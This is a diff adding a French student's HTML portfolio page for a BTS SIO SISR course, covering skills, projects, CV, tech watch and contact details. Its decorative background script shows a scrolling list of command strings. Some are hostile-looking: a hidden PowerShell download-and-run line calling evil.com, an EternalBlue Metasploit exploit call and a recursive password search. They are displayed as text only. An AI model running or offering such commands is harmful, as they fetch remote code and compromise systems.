@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Portfolio BTS SIO SISR - Elies ASKRI</title>
+  <link rel="stylesheet" href="style.css" />
+  <script>
+    function showSection(id) {
+      document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
+      document.querySelector(`nav a[onclick="showSection('${id}')"]`).classList.add('active');
+      document.querySelectorAll('section').forEach(s => {
+        s.classList.remove('active');
+      });
+      document.getElementById(id).classList.add('active');
+    }
+    window.onload = () => {
+      showSection('presentation');
+    }
+  </script>
+</head>
+<body>
+<div id="cmd-bg"></div>
+<header>
+  <h1>Portfolio - Elies ASKRI</h1>
+  <p>Étudiant en BTS SIO SISR</p>
+</header>
+<nav>
+  <a href="#" onclick="showSection('presentation')">Présentation</a>
+  <a href="#" onclick="showSection('bts-sio')">BTS SIO SISR</a>
+  <a href="#" onclick="showSection('dashboard')">Dashboard</a>
+  <a href="#" onclick="showSection('competences')">Compétences</a>
+  <a href="#" onclick="showSection('projets')">Projets</a>
+  <a href="#" onclick="showSection('cv')">CV</a>
+  <a href="#" onclick="showSection('tableau')">Tableau de synthèse</a>
+  <a href="#" onclick="showSection('veille')">Veille</a>
+  <a href="#" onclick="showSection('contact')">Contact</a>
+  <a href="#" onclick="showSection('jeux')">Jeux</a>
+</nav>
+<main class="terminal-main">
+  <section id="presentation">
+    <h2>Présentation</h2>
+    <p>Bienvenue ! Je m'appelle Eliès ASKRI, étudiant en BTS SIO option SISR à l'IPSSI. Curieux et passionné par tout ce qui touche à l'administration systèmes et réseaux, je me spécialise dans les infrastructures informatiques et la cybersécurité. Mon objectif ? Concevoir, sécuriser et maintenir des environnements IT robustes et performants.</p>
+  </section>
+  <section id="bts-sio">
+    <h2>BTS SIO - Option SISR</h2>
+    <p>Le BTS SIO (Services Informatiques aux Organisations), option SISR (Solutions d'Infrastructure, Systèmes et Réseaux), est bien plus qu'un simple diplôme : c'est une véritable passerelle vers le monde professionnel de l'IT.</p>
+    <p>Cette formation m'a permis de développer des compétences techniques solides : déploiement de serveurs (Windows), virtualisation (VMware, Hyper-V), configuration réseau, gestion de la sécurité (pare-feu, backup), gestion de l'Active Directory et bien plus encore.</p>
+    <p>Grâce à une pédagogie axée sur la pratique, entre TP concrets, projets d'infrastructure et stages en entreprise, j'ai appris à réagir face à des situations réelles, diagnostiquer les pannes, et proposer des solutions fiables et sécurisées.</p>
+    <p>Le BTS SIO SISR forme des profils opérationnels, recherchés par les entreprises : administrateur systèmes et réseaux, technicien support, responsable informatique en PME, ou consultant IT. Il constitue également une excellente base pour poursuivre en licence pro ou école d'ingénieur.</p>
+    <p>Dans un secteur en constante évolution, cette formation me prépare à relever les défis technologiques d'aujourd'hui et de demain.</p>
+  </section>
+  <section id="dashboard">
+    <h2>Dashboard</h2>
+    <div class="dashboard">
+      <div class="card" onclick="showSection('projets')" style="cursor:pointer;">
+        <h3>Projets</h3>
+        <p>3 projets</p>
+      </div>
+      <div class="card" onclick="showSection('competences')" style="cursor:pointer;">
+        <h3>Compétences</h3>
+        <p>6 compétences acquises</p>
+        <p>1 certification obtenue</p>
+      </div>
+      <div class="card" onclick="showSection('veille')" style="cursor:pointer;">
+        <h3>Veille</h3>
+        <p>IT-Connect</p>
+        <p>Podcasts</p>
+        <p>ETC...</p>
+      </div>
+    </div>
+  </section>
+  <section id="competences">
+    <h2>Compétences</h2>
+    <div class="carousel-container">
+      <div class="carousel-track">
+        <div class="tech-icon"><img src="icones/cisco.png" alt="Cisco" /><span>Cisco</span></div>
+        <div class="tech-icon"><img src="icones/Microsoft.png" alt="Microsoft" /><span>Microsoft</span></div>
+        <div class="tech-icon"><img src="icones/PS.png" alt="PowerShell" /><span>PowerShell</span></div>
+        <div class="tech-icon"><img src="icones/VB.png" alt="VirtualBox" /><span>VirtualBox</span></div>
+        <div class="tech-icon"><img src="icones/VMWARE.png" alt="VMware" /><span>VMware</span></div>
+        <div class="tech-icon"><img src="icones/veeam.png" alt="Veeam" /><span>Veeam</span></div>
+        <!-- duplicata pour boucle infinie -->
+        <div class="tech-icon"><img src="icones/cisco.png" alt="Cisco" /><span>Cisco</span></div>
+        <div class="tech-icon"><img src="icones/Microsoft.png" alt="Microsoft" /><span>Microsoft</span></div>
+        <div class="tech-icon"><img src="icones/PS.png" alt="PowerShell" /><span>PowerShell</span></div>
+        <div class="tech-icon"><img src="icones/VB.png" alt="VirtualBox" /><span>VirtualBox</span></div>
+        <div class="tech-icon"><img src="icones/VMWARE.png" alt="VMware" /><span>VMware</span></div>
+        <div class="tech-icon"><img src="icones/veeam.png" alt="Veeam" /><span>Veeam</span></div>
+      </div>
+    </div>
+    <h3>Certification</h3>
+    <div class="certification-container">
+      <div class="competence-item certification-item">
+        <img src="icones/ciscocyber.png" alt="Cisco Introduction to Cybersecurity" class="competence-icon" />
+        <p><strong>CISCO Introduction to Cybersecurity</strong><br/>
+           <span>CISCO — Obtenu le 12/2024</span>
+        </p>
+      </div>
+    </div>
+  </section>
+  <section id="projets">
+    <h2>Projets</h2>
+    <div class="project">
+      <h3>Proposition et mise en place d'un parc informatique et du réseau d'une entreprise pharmaceutique</h3>
+      <p><strong>Contexte :</strong> Projet de cours</p>
+      <p><strong>Objectif :</strong> Satisfaire les besoins d'une entreprise pharmaceutique en termes de système et de réseau</p>
+      <p><strong>Outils :</strong> CISCO</p>
+      <p><a href="projet2.zip" download>Télécharger mon projet</a></p>
+    </div>
+    <div class="project">
+      <h3>Technicien support de proximité pour client VVIP</h3>
+      <p><strong>Contexte :</strong> Stage</p>
+      <p><strong>Objectif :</strong> Assurer le bon developpement de l'entreprise</p>
+      <p><strong>Outils :</strong> Windows Server, Active Directory, FRESH, AnyDesk</p>
+    </div>
+  </section>
+  <section id="cv">
+    <h2>CV</h2>
+    <p><a href="elies_askri_cv_tech.pdf" target="_blank" rel="noopener">Télécharger mon CV (PDF)</a></p>
+    <embed src="elies_askri_cv_tech.pdf" type="application/pdf" width="100%" height="600px" />
+  </section>
+  <section id="tableau">
+    <h2>Tableau de synthèse</h2>
+    <p><a href="Tableau_de_synthèse.pdf" target="_blank" rel="noopener">Télécharger mon tableau (PDF)</a></p>
+    <embed src="Tableau_de_synthèse.pdf" type="application/pdf" width="100%" height="600px" />
+  </section>
+  <section id="veille">
+    <h2>Veille Technologique</h2>
+    <p>Je réalise une veille technologique régulière centrée sur la <strong>cybersécurité</strong>, l'<strong>administration réseau</strong> et les <strong>nouvelles technologies IT</strong>. L'objectif est de rester à jour sur les menaces, les outils et les bonnes pratiques dans le domaine.</p>
+    <h3>Thèmes surveillés :</h3>
+    <ul>
+      <li>Cybersécurité (vulnérabilités, ransomware, GPO, MFA, etc.)</li>
+      <li>Administration système (Windows Server, Active Directory, PowerShell)</li>
+      <li>Virtualisation et cloud </li>
+    </ul>
+    <h3>Sources utilisées :</h3>
+    <ul>
+      <li><a href="https://www.it-connect.fr" target="_blank" rel="noopener">IT-Connect</a> : tutoriels et actualités sur la cybersécurité</li>
+      <li>Alertes Google sur les mots-clés : "cybersécurité", "administration réseau"</li>
+    </ul>
+    <h3>Outils utilisés :</h3>
+    <ul>
+      <li><strong>Feedly</strong> pour agréger les flux RSS et suivre plusieurs sources au même endroit</li>
+      <li><strong>Pocket</strong> pour sauvegarder et organiser les articles importants</li>
+      <li><strong>Notion</strong> pour documenter les tendances et créer un historique de veille</li>
+    </ul>
+    <p>Cette veille me permet d'adapter mes compétences, d'anticiper les évolutions du secteur et de proposer des solutions pertinentes en entreprise.</p>
+  </section>
+  <section id="contact">
+    <h2>Contact</h2>
+    <p>📧 Email : <a href="mailto:askri.elies@gmail.com">askri.elies@gmail.com</a></p>
+    <p>💼 LinkedIn : <a href="https://www.linkedin.com/in/elies-askri" target="_blank" rel="noopener">linkedin.com/in/elies-askri</a></p>
+  </section>
+  <section id="jeux">
+    <h2>Jeux</h2>
+    <div class="jeux-container">
+      <a href="pendu.html" class="jeu-btn">Le Pendu</a>
+      <a href="simufc.html" class="jeu-btn">SimuFC</a>
+    </div>
+  </section>
+</main>
+<footer>
+  <p>Eliès ASKRI - Étudiant BTS SIO SISR à l'IPSSI</p>
+  <p>Email : <a href="mailto:askri.elies@gmail.com">askri.elies@gmail.com</a> | LinkedIn : <a href="https://www.linkedin.com/in/elies-askri" target="_blank" rel="noopener">elies-askri</a> | Téléphone : 06 01 49 53 05</p>
+  <p style="font-size:0.85rem; color:#009988cc;">© 2025 Eliès ASKRI  - Tous droits réservés</p>
+</footer>
+<script>
+// Commandes PowerShell/Métasploit à afficher
+const commands = [
+  'whoami',
+  'ipconfig /all',
+  'Get-NetIPAddress',
+  'nmap -sS 192.168.1.0/24',
+  'Invoke-WebRequest -Uri http://example.com',
+  'Get-Process | Where-Object {$_.CPU -gt 100}',
+  'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue"',
+  'Test-Connection -ComputerName 8.8.8.8',
+  'Get-LocalUser',
+  'netstat -ano',
+  'Get-Service | Where-Object {$_.Status -eq "Running"}',
+  'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/ps1\')"',
+  'arp -a',
+  'Get-EventLog -LogName Security -Newest 5',
+  'Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts',
+  'Get-WmiObject Win32_ComputerSystem',
+  'Get-ChildItem -Recurse | Select-String "password"',
+  'Get-Help Invoke-Command',
+  'Get-HotFix',
+  'Get-Command *net*',
+];
+
+const bg = document.getElementById('cmd-bg');
+const NB_LINES = 12;
+let cmdLines = [];
+
+function createCmdLine(text, y) {
+  const div = document.createElement('div');
+  div.className = 'cmd-line';
+  div.textContent = text;
+  div.style.top = y + 'px';
+  bg.appendChild(div);
+  return div;
+}
+
+function randomCmd() {
+  return commands[Math.floor(Math.random() * commands.length)];
+}
+
+function setupCmdBg() {
+  bg.innerHTML = '';
+  cmdLines = [];
+  const h = window.innerHeight;
+  for (let i = 0; i < NB_LINES; i++) {
+    const y = Math.round(i * (h / NB_LINES));
+    const cmd = randomCmd();
+    cmdLines.push(createCmdLine('PS C:> ' + cmd, y));
+  }
+}
+
+function animateCmdBg() {
+  const h = window.innerHeight;
+  for (let i = 0; i < cmdLines.length; i++) {
+    let y = parseFloat(cmdLines[i].style.top);
+    y += 0.25 + Math.random() * 0.15;
+    if (y > h) {
+      y = -24;
+      cmdLines[i].textContent = 'PS C:> ' + randomCmd();
+    }
+    cmdLines[i].style.top = y + 'px';
+  }
+  requestAnimationFrame(animateCmdBg);
+}
+
+window.addEventListener('resize', setupCmdBg);
+setupCmdBg();
+requestAnimationFrame(animateCmdBg);
+</script>
+</body>
+</html>
